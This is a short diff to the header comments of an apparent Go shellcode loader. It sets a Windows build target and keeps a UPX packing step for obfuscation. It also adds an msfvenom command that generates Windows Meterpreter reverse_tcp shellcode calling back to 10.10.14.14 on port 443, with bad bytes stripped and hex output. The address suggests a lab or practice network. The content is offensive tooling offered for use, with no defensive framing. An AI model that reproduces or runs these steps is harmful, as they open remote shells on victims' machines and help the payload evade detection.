@@ -1,5 +1,6 @@
-//compile: GOOS=windows GOARCH=amd64 go build
+//compile: set GOOS=windows; set GOARCH=amd64; go build
 //obfuscate: upx compress sc.exe --brute
+//spin shellcode: msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.14 LPORT=443 -b \x00 -f hex 
 
 package main
 
